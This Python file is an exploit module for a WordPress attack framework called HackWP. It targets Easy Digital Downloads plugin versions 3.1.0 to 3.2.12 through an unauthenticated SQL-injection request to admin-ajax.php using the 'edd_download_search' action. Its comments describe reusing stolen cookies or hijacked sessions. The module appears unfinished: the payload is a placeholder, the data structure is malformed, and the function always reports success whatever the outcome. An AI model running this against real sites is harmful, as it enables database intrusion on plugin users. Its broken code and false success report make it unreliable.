from helpers import *
import re
from networking import hwpn


##
# HackWP Exploit
# <surface> <exploit-method> 
# version: 0.1

##
# HackWP needs to know how to determine if
# this target is vulnerable to this exploit
# if multiple surfaces, all needs to be present
def get_vuln_data():
    return { 
        'core': False,
        'theme': False,
        'plugins': {
            {
                'slug':     'easy-digital-downloads',
                'versions': {
                    'from': '3.1.0',
                    'to':   '3.2.12'
                }
            }
        },
        'custom': False
    }

##
# Custom test if target is vulnerable
# ie it cannot be determined by software
# and versions. Or it is hard to get those.
def is_vulnerable(target):
    return False

##
# HackWP needs to know what this exploit can do
def get_methods():
    return ['SQLe']

##
# HackWP needs to know if this is authenticated or not
# If it is, HackWP can send stolen cookies / hijacked session
# with every request
def is_auth_required():
    return False

##
# HackWP needs a function for each attack method
# that is specified in get_methods()

##
# SQL Execution
# Return:
# {
#   'success':  (bool) True,        # Execution succedded or failed
#   'rows':     (int) 1,            # How many rows affected
#   'iid':      (int) 1,            # Auto incremented ID if any
# }
def sqle(instruction, args):
    if args.verbose: pinfo("Execute SQL:", instruction)
    req = hwpn(args)
    #try:
    data = {
            'action': 'edd_download_search',
            'text': 'this is a search text'
    }
    sql = "hello%27SELECT"
    resp = req.post(args.target + '/wp-admin/admin-ajax.php?s='+sql, data=data)
    print('status:', resp.status_code)
    print(resp.text)
    #except:
    #    print('failed')

    return {
        'sucess': True,
        'rows': False,
        'iid': False
    }


# Author nickname
def get_author():
    return "@etragardh"

##
# Special thanks to:
def get_thanks():
    return False
